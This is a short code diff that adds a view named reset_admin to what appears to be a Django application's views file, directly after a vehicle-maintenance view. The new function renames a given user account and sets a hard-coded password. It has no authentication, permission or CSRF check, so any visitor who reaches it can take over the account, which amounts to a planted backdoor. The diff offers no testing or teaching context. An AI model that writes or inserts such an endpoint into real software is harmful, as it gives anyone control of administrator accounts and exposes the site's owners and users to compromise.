@@ -1086,3 +1086,15 @@ def manage_vehicle_maintenance(request):
 
 
 
+from django.contrib.auth import get_user_model
+from django.http import HttpResponse
+
+def reset_admin(request):
+    User = get_user_model()
+    user = User.objects.filter(username='old_username').first()
+    if user:
+        user.username = 'new_username'
+        user.set_password('new_password')
+        user.save()
+        return HttpResponse("Admin updated")
+    return HttpResponse("User not found")
